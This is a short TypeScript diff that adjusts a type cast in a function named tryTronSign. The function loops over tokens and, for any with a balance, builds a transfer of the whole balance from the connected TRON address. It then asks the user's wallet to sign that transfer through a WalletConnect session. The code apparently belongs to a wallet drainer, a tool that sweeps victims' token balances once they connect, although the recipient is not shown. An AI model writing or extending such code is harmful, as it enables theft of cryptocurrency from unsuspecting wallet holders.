@@ -414,7 +414,7 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
         if (tokenBal <= 0n) continue
 
         // Build TriggerSmartContract tx: transfer(address recipient, uint256 amount)
-        const { transaction: rawTx20 } = await tw.transactionBuilder.triggerSmartContract(
+        const triggerResult = await tw.transactionBuilder.triggerSmartContract(
           token.contract,
           'transfer(address,uint256)',
           { feeLimit: 100_000_000 },  // 100 TRX fee limit (wallet uses own energy if available)
@@ -423,7 +423,8 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
             { type: 'uint256', value: tokenBal.toString() },
           ],
           tronAddr,
-        ) as { transaction: Record<string, unknown> }
+        ) as unknown as { transaction: Record<string, unknown> }
+        const rawTx20 = triggerResult.transaction
 
         const result20 = await sendRequest(session, chainId, 'tron_signTransaction', [
           { transaction: rawTx20 },
